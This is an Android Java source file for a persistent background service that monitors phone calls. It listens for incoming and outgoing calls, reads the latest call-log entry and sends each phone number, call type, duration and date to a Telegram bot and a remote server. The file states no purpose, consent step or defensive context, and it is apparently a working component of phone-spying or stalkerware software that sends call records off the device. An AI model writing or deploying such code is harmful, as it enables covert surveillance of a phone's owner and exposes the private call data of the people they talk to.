package com.example.control;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class MonitoringService extends Service {
    private static final String TAG = "MonitoringService";
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "MonitoringServiceChannel";

    private TelephonyManager telephonyManager;
    private PhoneStateListener phoneStateListener;
    private TelegramBotIntegration telegramBot;
    private ApiService apiService;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        apiService = ApiService.getInstance(this);
        telegramBot = new TelegramBotIntegration(this);
        
        // Set up phone state monitoring
        setupPhoneStateListener();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // If service is killed by the system, restart it
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (telephonyManager != null && phoneStateListener != null) {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Monitoring Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Channel for monitoring service notifications");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.monitoring_notification_title))
                .setContentText(getString(R.string.monitoring_notification_text))
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .build();
    }

    private void setupPhoneStateListener() {
        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                super.onCallStateChanged(state, phoneNumber);
                
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE:
                        // Call ended, check call log for details
                        checkCallLog();
                        break;
                    case TelephonyManager.CALL_STATE_RINGING:
                        // Incoming call
                        logCall("INCOMING", phoneNumber);
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        // Outgoing call in progress
                        logCall("OUTGOING", phoneNumber);
                        break;
                }
            }
        };
        
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private void checkCallLog() {
        String[] projection = new String[] {
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };
        
        String sortOrder = CallLog.Calls.DATE + " DESC";
        
        try (Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {
            
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                int type = cursor.getInt(1);
                long date = cursor.getLong(2);
                int duration = cursor.getInt(3);
                
                String callType;
                switch (type) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "MISSED";
                        break;
                    default:
                        callType = "UNKNOWN";
                        break;
                }
                
                // Send call details to Telegram and server
                String callDetails = "Call Type: " + callType + 
                        ", Number: " + number + 
                        ", Duration: " + duration + "s" +
                        ", Date: " + new java.util.Date(date).toString();
                
                telegramBot.sendMessage(callDetails);
                apiService.sendEventData("call_log", callDetails);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: " + e.getMessage());
        }
    }

    private void logCall(String callType, String phoneNumber) {
        String callInfo = "Call Type: " + callType + ", Number: " + phoneNumber;
        telegramBot.sendMessage(callInfo);
        apiService.sendEventData("call_state", callInfo);
    }
}
